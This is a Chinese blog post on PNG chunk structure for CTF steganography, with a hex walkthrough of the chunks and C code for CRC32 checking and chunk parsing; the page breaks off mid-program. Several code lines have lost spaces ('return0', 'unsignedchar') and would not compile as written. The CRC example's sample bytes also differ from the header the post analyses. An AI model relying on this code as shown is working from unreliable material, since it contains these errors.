<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>PNG在隐写中的应用 | Peterpan&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="让我们一起来了解一下png图片的构成吧～知其然亦知其所以然">
<meta property="og:type" content="article">
<meta property="og:title" content="PNG在隐写中的应用">
<meta property="og:url" content="http://yoursite.com/2017/10/29/PNG在隐写中的应用/index.html">
<meta property="og:site_name" content="Peterpan's Blog">
<meta property="og:description" content="让我们一起来了解一下png图片的构成吧～知其然亦知其所以然">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.37.29.png">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.56.48.png">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.58.01.png">
<meta property="og:updated_time" content="2017-11-04T09:54:25.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PNG在隐写中的应用">
<meta name="twitter:description" content="让我们一起来了解一下png图片的构成吧～知其然亦知其所以然">
<meta name="twitter:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png">
  
    <link rel="alternative" href="/atom.xml" title="Peterpan&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/miaopasi.gif">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/miaopasi.gif" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate">Peter pan</a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="http://hackcode.ishoulu.com/scp/">運命の門の石</a></li>
                        
                            <li><a href="https://github.com/Peterpan0927">作ショーケース</a></li>
                        
                            <li><a href="http://konachan.com/">失楽園</a></li>
                        
                            <li><a href="/about">世界の音楽</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="https://mail.qq.com/cgi-bin/frame_html?sid=_oJT_9NAAluUNmoy&r=19ceffb7525880fec0778e401ab5a0c5" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/Peterpan0927" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo" target="_blank" href="https://passport.weibo.com/visitor/visitor?entry=miniblog&a=enter&url=http%3A%2F%2Fweibo.com%2F&domain=.weibo.com&sudaref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DXJx2tZ7NciddPrWFwVpBgDI3XPGsiz4nrRDKFMkcfWu%26wd%3D%26eqid%3Dc1afc8ed00048e800000000358cf9830&ua=php-sso_sdk_client-0.6.23&_rand=1489999922.7477" title="weibo">weibo</a>
                            
                                <a class="fl google" target="_blank" href="#" title="google">google</a>
                            
                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
                            
                                <a class="fl linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/ARC-分类-MRC和ARC转换和兼容/" style="font-size: 10px;">ARC 分类 MRC和ARC转换和兼容</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Linux上的文件系统/" style="font-size: 10px;">Linux上的文件系统</a> <a href="/tags/Linux内核/" style="font-size: 10px;">Linux内核</a> <a href="/tags/Linux命令初认识/" style="font-size: 10px;">Linux命令初认识</a> <a href="/tags/Linux测试/" style="font-size: 10px;">Linux测试</a> <a href="/tags/Linux的前世今生/" style="font-size: 10px;">Linux的前世今生</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Review/" style="font-size: 10px;">Review</a> <a href="/tags/TCP-IP/" style="font-size: 15px;">TCP/IP</a> <a href="/tags/TCP-IP协议/" style="font-size: 10px;">TCP/IP协议</a> <a href="/tags/TableView-cell/" style="font-size: 10px;">TableView cell</a> <a href="/tags/Web安全-前后端基础/" style="font-size: 10px;">Web安全  前后端基础</a> <a href="/tags/Xcode/" style="font-size: 10px;">Xcode</a> <a href="/tags/hash算法-cache服务器/" style="font-size: 10px;">hash算法 cache服务器</a> <a href="/tags/hexo-github/" style="font-size: 10px;">hexo github</a> <a href="/tags/iOS-OC/" style="font-size: 10px;">iOS OC</a> <a href="/tags/iOS-UI/" style="font-size: 10px;">iOS UI</a> <a href="/tags/iOS多线程/" style="font-size: 15px;">iOS多线程</a> <a href="/tags/iOS开发/" style="font-size: 10px;">iOS开发</a> <a href="/tags/shell编程和文本处理/" style="font-size: 10px;">shell编程和文本处理</a> <a href="/tags/中文编码解决/" style="font-size: 10px;">中文编码解决</a> <a href="/tags/交互式笔记本/" style="font-size: 10px;">交互式笔记本</a> <a href="/tags/代理设计的理解/" style="font-size: 10px;">代理设计的理解</a> <a href="/tags/内存管理-MRC/" style="font-size: 10px;">内存管理 MRC</a> <a href="/tags/动漫/" style="font-size: 10px;">动漫</a> <a href="/tags/图片拉伸-通知-虚拟键盘/" style="font-size: 10px;">图片拉伸 通知 虚拟键盘</a> <a href="/tags/基础介绍-正则匹配/" style="font-size: 10px;">基础介绍 正则匹配</a> <a href="/tags/基础框架/" style="font-size: 10px;">基础框架</a> <a href="/tags/应用程序启动原理/" style="font-size: 10px;">应用程序启动原理</a> <a href="/tags/成员变量和属性变量-真私有属性/" style="font-size: 10px;">成员变量和属性变量 真私有属性</a> <a href="/tags/数据库和HighCharts调用/" style="font-size: 10px;">数据库和HighCharts调用</a> <a href="/tags/无框架原生爬虫/" style="font-size: 10px;">无框架原生爬虫</a> <a href="/tags/权限管理和I-O重定向、管道/" style="font-size: 10px;">权限管理和I/O重定向、管道</a> <a href="/tags/樱花下落的速度是每秒五厘米么？/" style="font-size: 10px;">樱花下落的速度是每秒五厘米么？</a> <a href="/tags/汇编基础/" style="font-size: 10px;">汇编基础</a> <a href="/tags/沙盒和app主流框架/" style="font-size: 10px;">沙盒和app主流框架</a> <a href="/tags/简单微博-MVC实现/" style="font-size: 10px;">简单微博 MVC实现</a> <a href="/tags/类的本质-重写init-点语法/" style="font-size: 10px;">类的本质 重写init 点语法</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/网络服务器/" style="font-size: 10px;">网络服务器</a> <a href="/tags/网络硬件/" style="font-size: 10px;">网络硬件</a> <a href="/tags/较完善的App/" style="font-size: 10px;">较完善的App</a> <a href="/tags/非对称加密算法/" style="font-size: 10px;">非对称加密算法</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://imbajin.com">name</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">二次元、爱运动、爱交友、爱旅行、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Peter pan</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/miaopasi.gif" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">Peter pan</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="http://hackcode.ishoulu.com/scp/">運命の門の石</a></li>
                
                    <li><a href="https://github.com/Peterpan0927">作ショーケース</a></li>
                
                    <li><a href="http://konachan.com/">失楽園</a></li>
                
                    <li><a href="/about">世界の音楽</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="https://mail.qq.com/cgi-bin/frame_html?sid=_oJT_9NAAluUNmoy&r=19ceffb7525880fec0778e401ab5a0c5" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/Peterpan0927" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="https://passport.weibo.com/visitor/visitor?entry=miniblog&a=enter&url=http%3A%2F%2Fweibo.com%2F&domain=.weibo.com&sudaref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DXJx2tZ7NciddPrWFwVpBgDI3XPGsiz4nrRDKFMkcfWu%26wd%3D%26eqid%3Dc1afc8ed00048e800000000358cf9830&ua=php-sso_sdk_client-0.6.23&_rand=1489999922.7477" title="weibo">weibo</a>
                    
                        <a class="google" target="_blank" href="#" title="google">google</a>
                    
                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
                    
                        <a class="linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-PNG在隐写中的应用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/10/29/PNG在隐写中的应用/" class="article-date">
      <time datetime="2017-10-29T07:03:53.000Z" itemprop="datePublished">2017-10-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      PNG在隐写中的应用
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/文件格式-数据隐藏/">文件格式 数据隐藏</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>让我们一起来了解一下png图片的构成吧～知其然亦知其所以然</p>
<a id="more"></a>
<h2 id="00X0-前言"><a href="#00X0-前言" class="headerlink" title="00X0-前言"></a>00X0-前言</h2><p>其实是在研究隐写术的时候遇到了瓶颈，所以决定去系统的了解一下png的文件格式做一个总结，到这个阶段的隐写术不可能是单纯的三板斧解决的问题，以前为了做题总是将工具当作了主导，其实这样是不对的。工具只能起一部分的分析作用，自身的知识储备才是最重要的部分，否则始终都只是一个<code>script kid</code>。在这里向道哥致敬～</p>
<h2 id="0X01-PNG文件格式"><a href="#0X01-PNG文件格式" class="headerlink" title="0X01-PNG文件格式"></a>0X01-PNG文件格式</h2><p><strong>1、PNG文件署名域</strong></p>
<p>前8字节</p>
<p>固定格式，16进制为： 89 504e 47 0d 0a 1a 0a</p>
<p><strong>2、数据块</strong></p>
<p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>
<p>Chunk Data(数据块数据): 可变长度,存储数据</p>
<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>
<p>数据块类型：</p>
<p><strong>1. 关键数据块(criticalchunk)</strong></p>
<p>(1) 文件头数据块IHDR(headerchunk) - 包含PNG文件的基本信息 - 一个PNG数据流中只能有一个IHDR - 必须在PNG文件最前面</p>
<p>(2) 调色板数据块PLTE(palettechunk) - 包含有与索引彩色图像(indexed-color image)相关的彩色变换数据 - 必须在IDAT之前</p>
<p>(3) 图像数据块IDAT(imagedata chunk) - 存储实际的数据 - 可存在多个 -必须与其他IDAT连续</p>
<p>(4) 图像结束数据IEND(imagetrailer chunk) - 固定格式，16进制为： 0000 00 00 49 45 4E 44 AE 42 60 82 - 必须在PNG文件最尾部</p>
<p><strong>2. 辅助数据块(ancillarychunk)</strong></p>
<p>用于辅助指示PNG图像中的层、文字等信息</p>
<p>可删除，不影响图片浏览，但图像将失去原来的可编辑性</p>
<p>(1) 背景颜色数据块bKGD(backgroundcolor)</p>
<p>(2) 基色和白色度数据块cHRM(primarychromaticities and white point)</p>
<p>(3) 图像γ数据块gAMA(image gamma)</p>
<p>(4) 图像直方图数据块hIST(imagehistogram)</p>
<p>(5) 物理像素尺寸数据块pHYs(physicalpixel dimensions)</p>
<p>(6) 样本有效位数据块sBIT(significantbits)</p>
<p>(7) 文本信息数据块tEXt(textualdata)</p>
<p>(8) 图像最后修改时间数据块tIME(image last-modification time)</p>
<p>(9) 图像透明数据块tRNS(transparency)</p>
<p>(10) 压缩文本数据块zTXt(compressed textual data)</p>
<h2 id="0x02-实例图片分析"><a href="#0x02-实例图片分析" class="headerlink" title="0x02-实例图片分析"></a>0x02-实例图片分析</h2><p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png" alt="屏幕快照 2017-10-29 下午2.36.18.png"></p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.37.29.png" alt="屏幕快照 2017-10-29 下午2.37.29.png"></p>
<ol>
<li>png文件署名域</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//固定格式</span></div><div class="line"><span class="number">89</span> <span class="number">50</span> <span class="number">4</span>e <span class="number">47</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">1</span>a <span class="number">0</span>a</div></pre></td></tr></table></figure>
<p>据块结构：</p>
<p>Length: 00 00 00 0D</p>
<p>前4字节，定义长度，00 00 000D十进制为13，代表长度为13个字节</p>
<p>Chunk Type Code： 4948 44 52</p>
<p>4字节，定义数据块类型码，此处为IHDR</p>
<p>Chunk Data： 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>共13字节，定义数据内容</p>
<p>CRC： 4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
<p>即对以下十六进制作计算： 49 48 44 52 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>我们可以编写程序对CRC算法进行一次验证；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">char</span>* InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span>  Crc32Table[<span class="number">256</span>];     </div><div class="line"> <span class="keyword">int</span> i,j;        </div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">            Crc= i;        </div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">              <span class="keyword">if</span> (Crc &amp; <span class="number">1</span>)        </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">              <span class="keyword">else</span>      </div><div class="line">                        Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">            &#125;        </div><div class="line">            Crc32Table[i]= Crc;        </div><div class="line"> &#125;        </div><div class="line"> Crc=<span class="number">0xffffffff</span>;        </div><div class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">            Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line"> 	&#125;     </div><div class="line"> 	Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line"> 	<span class="keyword">return</span> Crc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            <span class="keyword">char</span> buf[<span class="number">17</span>]=&#123;<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x52</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>&#125;;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=GetCrc32(buf,<span class="keyword">sizeof</span>(buf));</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%08X\n"</span>,crc32);</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行程序之后发现算出来的CRC校验准确无误，那么从这里我们就可以想到就算是在，Unix/linux系统上修改了图片的宽高之后与CRC校验不符，也可以通过这种方a式来修改CRC校验，hhh，那么就不需要该死的windows了。</p>
<p><strong>(2) gAMA</strong></p>
<blockquote>
<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B18F 0B FC 61 05 </p>
<p>….gAMA..睆.黙.</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 04</p>
<p>Chunk Type Code： 6741 4D 41</p>
<p>Chunk Data： 00 00B1 8F</p>
<p>CRC： 0B FC 61 05</p>
<p><strong>(3) cHRM</strong></p>
<blockquote>
<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A26 00 00 80 84 ; … cHRM..z&amp;..€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 7530 00 00 EA 60 </p>
<p>..?..€?.u0..阘 00000051h: 00 00 3A 9800 00 17 70 9C BA 51 3C ; ..:?..p満Q&lt;</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 20</p>
<p>Chunk Type Code： 6348 52 4D</p>
<p>Chunk Data： 00 007A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 9800 00 17 70</p>
<p>CRC： 9C BA 51 3C</p>
<p><strong>(4) IDAT</strong></p>
<p><strong>(5-14) tEXt</strong></p>
<p><strong>(15)IEND</strong></p>
<p>数据块结构：</p>
<p>Length: 00 00 00 00</p>
<p>Chunk Type Code： 4945 4E 44</p>
<p>Chunk Data：</p>
<p>CRC： AE 42 60 82</p>
<p>固定结构，CRC的值为对ChunkType Code作CRC32校验</p>
<h2 id="0x03-编写程序分析文件格式"><a href="#0x03-编写程序分析文件格式" class="headerlink" title="0x03-编写程序分析文件格式"></a>0x03-编写程序分析文件格式</h2><p>开发工具：vc6.0、dev-c++、codeblocks</p>
<ol>
<li>读取PNG文件</li>
</ol>
<p>保存为example2.cpp，代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE *fp;   </div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;   </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            <span class="keyword">int</span> len=ftell(fp);</div><div class="line">            unsignedchar *buf=<span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[len];      </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"len=%d\n"</span>,len);</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)</div><div class="line">            &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"%02X"</span>,buf[i<span class="number">-1</span>]);</div><div class="line">                        <span class="keyword">if</span>(i%<span class="number">16</span>==<span class="number">0</span>)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">            &#125;</div><div class="line">            fclose(fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析:</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.56.48.png" alt="屏幕快照 2017-10-29 下午2.56.48.png"></p>
<ol>
<li>解析数据块结构</li>
</ol>
<p>从第8字节开始，读前四字节为ChunkLength</p>
<p>对应的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> intChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div></pre></td></tr></table></figure>
<p>接着四字节为ChunkName</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"ChunkName:%c%c%c%c\n"</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>然后根据ChunkLength读出完整的ChunkData</p>
<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
<p>保存为check.cpp,完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                        Crc= i;        </div><div class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                    <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                                Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                    <span class="keyword">else</span>       </div><div class="line">                                                Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                        &#125;        </div><div class="line">                        Crc32Table[i]= Crc;        </div><div class="line">            &#125;        </div><div class="line">            Crc=<span class="number">0xffffffff</span>;        </div><div class="line">            <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line">            &#125;     </div><div class="line">            Crc ^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">            returnCrc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE*fp;   </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span 